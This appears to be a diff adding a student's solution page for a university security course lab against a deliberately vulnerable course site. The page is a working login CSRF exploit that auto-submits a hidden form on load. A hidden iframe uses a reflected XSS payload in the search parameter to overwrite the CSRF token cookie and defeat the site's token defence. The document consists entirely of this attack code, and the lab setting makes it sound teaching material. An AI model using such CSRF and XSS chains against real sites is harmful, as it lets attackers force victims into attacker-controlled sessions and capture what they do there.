@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+    <body onload="document.forms[0].submit()">
+        <iframe name="gun" src="bungle-cs461.csl.illinois.edu/search?q=<script>document.cookie+%3D+'csrf_token+%3D+983dab9d4a075bd2cd79ee5d8bf2492a'%3B<%2Fscript>" style="display: none;"></iframe>
+            <form action="http://bungle-cs461.csl.illinois.edu/login?csrfdefense=1&xssdefense=0" method="post" target="gun">
+                <input type="hidden" name="csrf_token" value="983dab9d4a075bd2cd79ee5d8bf2492a">
+                <input type="hidden" name="username" value="attacker">
+                <input type="hidden" name="password" value="l33th4x">
+            </form>
+    </body>
+</html>
